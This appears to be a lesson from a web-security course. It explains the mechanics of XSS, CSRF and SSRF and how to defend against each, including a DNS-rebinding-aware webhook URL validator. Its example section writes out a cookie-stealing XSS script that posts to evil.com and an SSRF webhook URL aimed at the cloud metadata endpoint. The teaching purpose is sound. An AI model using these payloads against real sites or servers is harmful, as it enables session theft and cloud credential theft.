# XSS, CSRF & SSRF — Three Different Trust Boundaries, Three Different Breaks

## 1. Why does this exist?

Module 2, Lesson 4 already introduced `HttpOnly` and `SameSite` as defenses against XSS and CSRF, deliberately without deriving the attacks themselves — this lesson gives all three vulnerabilities (XSS, CSRF, and SSRF, the third genuinely new here) their full, precise mechanics, because each one breaks a *different* trust boundary, and confusing them (a real, common occurrence) leads to applying the wrong defense to the wrong problem.

## 2. Mental model

XSS is an attacker getting their own note read aloud in *your* voice, inside a conversation the victim trusts — malicious script running as if it were your own site's legitimate code, in the victim's own browser. CSRF is an attacker forging a signed letter in the victim's name and mailing it without the victim's knowledge — a request the victim's browser sends, using the victim's own credentials, that the victim never intended. SSRF is tricking a trusted messenger (your own server) into personally delivering a request somewhere the outside world was never allowed to reach directly — using your server's own trusted network position against it.

## 3. Technical explanation

**XSS (Cross-Site Scripting) — attacker-controlled script executing in a victim's browser, in the security context of your own site:** the fundamental cause is a trust boundary violation between user-supplied *data* and the page's *rendered HTML/JavaScript* — if user input is inserted into a page without proper escaping, and that input contains `<script>` tags or event handlers, the browser executes it as if it were part of the legitimate page. Three distinct variants, worth distinguishing precisely because they have different attack surfaces and defenses: **stored XSS** (malicious input is saved server-side — a comment, a profile field — and served to every subsequent viewer, the most severe variant since it requires no per-victim delivery mechanism); **reflected XSS** (malicious input in a request, e.g., a URL query parameter, is echoed back unescaped in the immediate response — requires tricking a victim into clicking a crafted link); **DOM-based XSS** (the vulnerability lives entirely in client-side JavaScript manipulating the page's DOM using untrusted data, without the malicious payload ever necessarily touching the server at all). The core defense across all three: **output encoding/escaping** — ensuring any user-supplied data rendered into HTML is escaped so browser-special characters (`<`, `>`, `&`) are rendered as literal text, never interpreted as markup — modern frontend frameworks (React, and equivalents) escape by default, which is precisely why most XSS in modern apps occurs at the specific places developers deliberately bypass that default (`dangerouslySetInnerHTML` and its equivalents).

**Why `HttpOnly` (Module 2, Lesson 4) is specifically an XSS *mitigation*, not an XSS *prevention* — a precise distinction worth restating now with the full mechanism behind it:** `HttpOnly` doesn't stop XSS from occurring — it limits the *damage* a successful XSS attack can do, specifically by making a session cookie unreadable to the injected script, so even if an attacker's script runs, it can't directly exfiltrate that cookie. This is defense-in-depth, not a substitute for output-encoding discipline, which remains the actual, primary defense against XSS occurring at all.

**CSRF (Cross-Site Request Forgery) — a forged request riding on a victim's authenticated session, sent without the victim's knowledge:** because a browser automatically attaches cookies (including session cookies, Module 2, Lesson 4) to requests targeting the cookie's origin, *regardless of which page initiated the request*, a malicious page hosted anywhere else can trigger a request to your site (a form auto-submitted via JavaScript, or even just an `<img>` tag pointing at a state-changing `GET` URL) that the victim's browser dutifully attaches their real session cookie to — the server, seeing a validly-cookied request, has no inherent way to know it wasn't the user's own, deliberate action. `SameSite=Lax` (Module 2, Lesson 4) closes most of this by restricting cross-site cookie attachment on non-GET requests — but as that lesson stressed, this only works if state-changing operations correctly avoid `GET` (Module 1, Lesson 5's method-safety content, now shown to be a *security* boundary, not merely an infrastructure-caching convention). A second, independent, commonly-paired defense worth naming here: **CSRF tokens** — a unique, unpredictable value embedded in a legitimate form/request that the server verifies matches what it issued, which a cross-site forged request has no way to know or include, since the attacker's page never legitimately received it.

**SSRF (Server-Side Request Forgery) — the genuinely distinct, third trust-boundary break, and the one most directly relevant to Module 2, Lesson 9's webhook content:** an attacker manipulates a URL your **server itself** fetches (a webhook registration URL, an image-import-from-URL feature, an "unfurl this link" preview feature) to make your server send a request somewhere the attacker couldn't reach directly — critically, the request originates from your server's own trusted network position, which means it can **bypass firewall rules and network segmentation** that would have blocked the same request from an external, untrusted source. The two specific, real, commonly-exploited SSRF targets worth naming precisely: **internal/private network addresses** (`127.0.0.1`, `10.x.x.x`, `192.168.x.x`, and their less-obvious obfuscated forms — decimal IP notation, IPv6-mapped addresses — a real, common bypass of naive string-matching defenses) reaching services never meant to be internet-accessible; and **cloud metadata service endpoints** (a well-known, fixed internal address, commonly `169.254.169.254`, that cloud providers expose to instances for retrieving instance credentials and configuration) — SSRF against this specific endpoint is a well-documented, historically real path to full cloud-account credential theft, not a theoretical worst case.

**SSRF prevention, precisely, and why the "obvious" fix is genuinely harder than it looks:** a naive defense (checking whether a URL's hostname string contains "localhost" or "169.254") is trivially bypassed by the many obfuscation techniques above, or by an attacker-controlled DNS record that resolves to a private IP only *after* your validation check ran (a **DNS rebinding** attack, worth knowing by name — the URL passes validation pointing at a legitimate external host, but by the time the actual request is made, DNS has been changed to resolve to an internal address instead). Robust prevention requires resolving the URL and validating the **actual resulting IP address** (not just the hostname string) against private/reserved ranges immediately before making the request (minimizing the window for a rebinding race), explicitly blocking cloud metadata addresses, and — the documented, honest caveat — a plain allow-list of permitted destination hosts isn't always feasible for genuinely user-supplied webhook URLs, since the whole point of a webhook feature is accepting arbitrary, unpredictable external URLs.

## 4. How it works internally

A webhook-registration feature (Module 2, Lesson 9) accepting an arbitrary URL from a user is, structurally, exactly SSRF's textbook attack surface — the fix requires the server, at the moment it actually dispatches the webhook payload, to resolve and validate the destination's real IP address against private/metadata ranges, not merely eyeball the URL string at registration time, since registration-time validation alone is exactly what a DNS-rebinding attack defeats.

## 5. Example

```
Stored XSS payload: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
  submitted as a "comment," rendered unescaped to every subsequent viewer.

SSRF payload: a webhook URL registered as http://169.254.169.254/latest/meta-data/
  tricking the server into fetching cloud instance credentials on the attacker's behalf.
```

## 6. Code

```ts
import { isIP } from 'node:net';
import dns from 'node:dns/promises';

async function isSafeWebhookUrl(url: string): Promise<boolean> {
  const { hostname } = new URL(url);
  const addresses = await dns.resolve4(hostname); // resolve to the ACTUAL IP, not just the hostname string
  return addresses.every((addr) => !isPrivateOrMetadataAddress(addr)); // check IPs, not the hostname
  // Real production code re-checks this at dispatch time, not only registration time, to reduce the DNS-rebinding window.
}
```

## 7. Failure scenarios

- **Stored XSS via a user-generated content field rendered without escaping** — every visitor to that content executes the attacker's script, a real, severe, self-propagating incident class.
- **A CSRF-vulnerable, state-changing `GET` endpoint** (Module 1, Lesson 5's method-safety violation, now shown as a direct security consequence, not just an infrastructure-caching one) — `SameSite=Lax` provides zero protection for it, exactly as Module 2, Lesson 4 warned.
- **A webhook feature validating only the URL string at registration**, exploited later via DNS rebinding to reach an internal service or the cloud metadata endpoint at actual dispatch time.

## 8. Common misconceptions

- **"XSS, CSRF, and SSRF are variations of the same attack."** They break three genuinely different trust boundaries (script execution context, forged authenticated requests, and the server's own trusted network position, respectively) — conflating them leads to applying the wrong specific defense.
- **"HttpOnly prevents XSS."** It mitigates one specific consequence (cookie theft) of a successful XSS attack — output encoding is the actual prevention.
- **"Checking a URL string for 'localhost' is sufficient SSRF prevention."** Trivially bypassed by IP obfuscation and DNS rebinding — real prevention requires resolving and validating actual IP addresses, ideally at dispatch time.

## 9. Trade-offs

Output encoding (XSS defense): essentially free with modern frameworks' defaults, real risk only where developers deliberately bypass them. CSRF tokens plus SameSite: layered, complementary defenses, neither alone fully sufficient (SameSite fails for GET-based state changes; tokens require server-side state or a verifiable signing scheme). SSRF prevention: genuinely harder to make airtight for legitimately arbitrary user-supplied URLs (webhooks), requiring ongoing, dispatch-time validation rather than a one-time check.

## 10. Real-world applications

- Project 3's notification platform, and any webhook-registration feature across this curriculum's projects, is a direct, textbook SSRF surface requiring this lesson's dispatch-time IP validation, not a one-time registration check.
- Any user-generated-content feature (comments, profile bios, Project 4's SaaS product content) needs this lesson's XSS output-encoding discipline as a baseline, non-optional requirement.

## 11. Connections

Directly extends Module 2, Lesson 4's `HttpOnly`/`SameSite` content with the full attack mechanics behind those defenses, and Module 2, Lesson 9's webhook content with SSRF's specific risk to exactly that feature shape. Depends on Module 1, Lesson 5's method-safety content (CSRF's `SameSite=Lax` gap depends directly on it).

## 12. Practical exercise

Build a minimal webhook-registration endpoint, register a URL pointing at a locally-running internal service, and confirm the naive version successfully SSRFs against it — then implement this lesson's IP-resolution-based validation and confirm the attack is blocked.

## 13. Challenge

For Project 3's notification platform, design the full SSRF defense for any user-supplied callback/webhook URL feature, explicitly addressing DNS rebinding by specifying exactly when (registration vs. dispatch time) and how validation occurs.

## 14. Mastery test

- Distinguish stored, reflected, and DOM-based XSS by where the malicious payload originates and is delivered.
- Explain precisely why `SameSite=Lax` provides no CSRF protection for a state-changing `GET` endpoint, connecting to Module 1, Lesson 5.
- Explain DNS rebinding well enough to state why registration-time-only SSRF validation is insufficient.
- Explain why an SSRF attack against a cloud metadata endpoint is categorically more severe than SSRF against an arbitrary internal service.
